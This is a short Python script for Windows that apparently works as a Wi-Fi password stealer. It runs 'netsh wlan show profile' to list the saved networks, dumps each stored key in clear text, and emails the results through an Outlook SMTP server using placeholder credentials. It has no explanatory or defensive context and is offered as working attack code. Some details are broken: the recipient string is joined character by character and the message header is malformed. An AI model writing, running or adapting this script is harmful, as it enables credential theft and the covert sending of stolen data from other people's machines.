#!/usr/bin/env python3

import subprocess
import smtplib
import re


def send_mail(email, password, message):
    to = ', '.join(email)
    message = fr'\From: {email} To: {to} {message}'
    server = smtplib.SMTP("smtp-mail.outlook.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def get_ssid_list():
    command = 'netsh wlan show profile'
    networks = subprocess.check_output(command, shell=True)
    return re.findall(br"(?:Profile\s*:\s)(.*)", networks)


def get_ssid_details(ssid):
    command = f'netsh wlan show profile {ssid.decode()} key=clear'
    return subprocess.check_output(command, text=True, shell=True)


def main():
    result = ''
    ssid_list = get_ssid_list()
    for ssid_name in ssid_list:
        ssid_detail = get_ssid_details(ssid_name)
        result = result + ssid_detail

    send_mail("my@mail.com", "mypassword", result)


if __name__ == '__main__':
    main()
